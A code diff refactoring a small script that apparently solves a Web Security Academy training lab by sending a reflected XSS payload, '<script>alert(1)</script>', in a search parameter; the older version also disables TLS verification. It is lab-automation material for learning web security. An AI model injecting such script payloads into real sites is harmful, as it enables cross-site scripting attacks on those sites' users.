@@ -1,14 +1,9 @@
-from web_security_academy.core.utils import *
-
-import requests
+from web_security_academy.core.logger import logger
 
 
-def solve_lab(url, proxies):
-    params = {"search": "<script>alert(1)</script>"}
-    print_info(
-        f'Performing reflected XSS attack by visiting "{url}" with the following parameters:'
-    )
-    print(params)
+def solve_lab(session):
+    xss = "<script>alert(1)</script>"
 
-    requests.get(url, params=params, proxies=proxies, verify=False)
-    print_success("Reflected XSS attack performed.\n")
+    session.get_path("/", params={"search": xss})
+    logger.info("Searched the following payload:")
+    logger.info(xss)
